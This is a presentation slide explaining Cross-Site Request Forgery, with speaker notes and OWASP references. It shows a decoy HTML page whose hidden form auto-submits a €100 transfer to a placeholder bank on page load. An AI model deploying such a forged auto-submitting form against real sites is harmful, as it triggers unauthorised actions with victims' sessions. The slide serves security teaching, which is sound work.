---
# class: pl-15% pr-15% pt-10%
layout: center
title: Cross-Site Request Forgery
---
<h1>Cross-Site Request Forgery</h1>

<Transform scale="1">

```html {all|13-17|21|all}
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mario Rossi's totally legit website</title>
</head>

<body>
  <h1>Welcome to Mario Rossi's totally legit website</h1>
  <p>Lorem Ipsum...</p>

  <form action="https://vulnerable-bank.com/transfer.html" id="send-money-to-mario-rossi" method="POST">
    <input type="hidden" name="to" value="Mario Rossi">
    <input type="hidden" name="iban" value="IT81F0300203280886251833317">
    <input type="hidden" name="amount" value="€100">
  </form>

  <script>
  document.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById('send-money-to-mario-rossi').submit()
  })
  </script>
</body>
</html>
```

</Transform>

<!--
From [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/):

> The real problem here is not that the decoy website sends the request, but that the victim's browser will send the victim's session cookies with it.
The request will be sent with the full authority the victim currently hold at this time, which means if the victim is logged in to his/her bank, he/she will send 100 EUR to Mario Rossi.

That IBAN number is fake, obviously. It was generated with [this tool](http://randomiban.com/?country=Italy).

Some applications might not be vulnerable to CSRF attacks. For example, see [this discussion in Plotly Dash](https://github.com/plotly/dash/issues/141).

- [Cross Site Request Forgery (OWASP)](https://owasp.org/www-community/attacks/csrf)
- [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
-->
